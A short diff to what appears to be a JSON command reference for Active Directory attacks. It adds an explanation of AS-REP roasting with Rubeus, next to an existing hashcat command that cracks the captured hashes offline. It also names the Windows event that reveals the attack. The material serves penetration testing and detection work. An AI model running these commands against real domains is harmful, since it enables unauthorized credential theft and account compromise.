@@ -95,5 +95,6 @@
       "label": "Crack",
       "command": "hashcat -m 18200 asrep.txt rockyou.txt"
     }
-  ]
+  ],
+  "explain": "Rubeus roasts accounts with Kerberos pre-auth disabled, no credentials needed:\n  asreproast               request AS-REP responses for every UF_DONT_REQUIRE_PREAUTH account (add /user:<user> for one)\n  /outfile:asrep.txt       save the crackable hashes\nCrack offline with hashcat -m 18200. Defensively, this shows up as Event 4768 with Pre-Auth Type 0 and RC4 (0x17)."
 }
